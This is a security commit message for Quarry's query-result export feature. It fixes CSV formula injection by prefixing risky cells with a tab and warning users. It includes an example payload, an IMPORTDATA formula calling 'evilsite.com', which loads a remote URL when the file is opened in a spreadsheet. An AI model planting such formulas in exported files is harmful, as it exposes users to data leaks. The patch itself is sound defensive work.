SECURITY: escape CSV injections
The "export resultsets" function of Quarry was not
protected against CSV Injection, aka Formula Injection.

https://www.owasp.org/index.php/CSV_Injection
https://pentestmag.com/formula-injection/
http://georgemauer.net/2017/10/07/csv-injection.html

For example, this query:

    select '=IMPORTDATA("https://evilsite.com")';

Was creating when exported as CSV a file that contains:

"=IMPORTDATA(""https://evilsite.com"")"
"=IMPORTDATA(""https://evilsite.com"")"

For example, this file, when imported in Google Docs,
was loading the remote url without warnings.

This patch escapes problematic cases in exports and shows
a warning to the user in the query view page.

Tabulate "\t" is added as cell prefix for ones that
starts with one of the four problematic charters,

    =-+@

The escape is done when the output is generated for affected
formats (mainly those spreadsheet formats). This is to avoid
polluting the raw data archive. Unforunately, there is no
warning to the user that data has been altered.

Bug: T209226
Change-Id: I099a836897c76852e13a708c8ba57532aaeab6e8